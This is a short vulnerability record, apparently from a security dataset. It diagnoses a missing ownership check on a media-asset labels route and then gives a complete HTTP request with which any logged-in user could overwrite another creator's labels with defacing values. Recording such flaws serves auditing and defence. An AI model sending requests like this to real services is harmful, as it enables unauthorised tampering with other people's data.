diagnosis: The route allows updating descriptive tags and catalog labels on a MediaAssetDocument using its MongoDB document ID. Because it fails to check that asset.creator_user_id == current_user.id or that current_user belongs to the asset's project group, any user can overwrite media labels belonging to other content creators.
exploit_request:
POST /media/assets/65b120c48e71920042da1823/labels HTTP/1.1
Host: cdn.assetmanager.io
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{"labels": ["defaced", "public_spoof"]}
